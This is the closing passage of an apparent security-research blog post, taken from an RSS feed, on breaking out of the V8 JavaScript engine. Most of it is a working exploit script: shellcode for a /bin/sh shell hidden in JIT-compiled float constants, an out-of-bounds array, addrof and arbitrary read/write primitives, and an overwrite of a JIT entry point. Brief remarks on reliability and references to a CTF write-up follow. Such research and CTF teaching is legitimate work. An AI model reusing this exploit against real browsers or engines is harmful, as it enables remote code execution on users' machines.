fs[0] = x;
return is[0];
}
/* converts a 64-bit uint to a float */
function itof(x) {
is[0] = x;
return fs[0];
}
/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */
const foo = () =&amp;gt; {
return [
1.9711828979523134e-246,
1.9562205631094693e-246,
1.9557819155246427e-246,
1.9711824228871598e-246,
1.971182639857203e-246,
1.9711829003383248e-246,
1.9895153920223886e-246,
1.971182898881177e-246
];
}
for (let i = 0; i &amp;lt; 0x40000; i&amp;#43;&amp;#43;)
foo();
/* create an oob array */
let oob = [1.1];
oob.len(1337);
/* flt.elements @ oob[6] */
let flt = [1.1];
/* obj.elements @ oob[15] */
let tmp = {a: 1};
let obj = [tmp];
/* addrof primitive */
function addrof(o) {
oob[6] = oob[15];
obj[0] = o;
return (ftoi(flt[0]) &amp;amp; 0xffffffffn) - 1n;
}
/* 64-bit read primitive */
function read(p) {
let a = ftoi(oob[6]) &amp;gt;&amp;gt; 32n;
oob[6] = itof((a &amp;lt;&amp;lt; 32n) &amp;#43; p - 8n &amp;#43; 1n);
return ftoi(flt[0]);
}
/* 64-bit write primitive */
function write(p, x) {
let a = ftoi(oob[6]) &amp;gt;&amp;gt; 32n;
oob[6] = itof((a &amp;lt;&amp;lt; 32n) &amp;#43; p - 8n &amp;#43; 1n);
flt[0] = itof(x);
}
/* get a pointer to the foo.code object */
let code = (read(addrof(foo) &amp;#43; 0x18n) - 1n) &amp;amp; 0xffffffffn;
/* get the entry point of the compiled function */
let entry = (read(code &amp;#43; 0xcn));
/* overwrite the entry point with the start of the shellcode */
write(code &amp;#43; 0xcn, entry &amp;#43; 0x69n);
foo();
&lt;/code>&lt;/pre>
&lt;/div>
&lt;/p>
&lt;p>One last thing to note, while this exploit technique does seem fairly stable, different kernel versions or platforms will affect the offsets of the immediate numbers in the JIT compiled code.&lt;/p>
&lt;p>This poses a slight problem as it significantly affects the reliability. Obviously techniques already exist to combat this issue - e.g. incrementing the offsets until the exploit executes successfully.&lt;/p>
&lt;p>I do have some ideas I&amp;rsquo;d like to explore further around increasing exploit reliability - but those will come in another article.&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8">V8 Sandbox - High-Level Design Doc&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk">V8 Sandbox - External Pointer Sandboxing&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html">Dice CTF Memory Hole: Breaking V8 Heap Sandbox&lt;/a>&lt;/li>
&lt;/ul></content></item></channel></rss>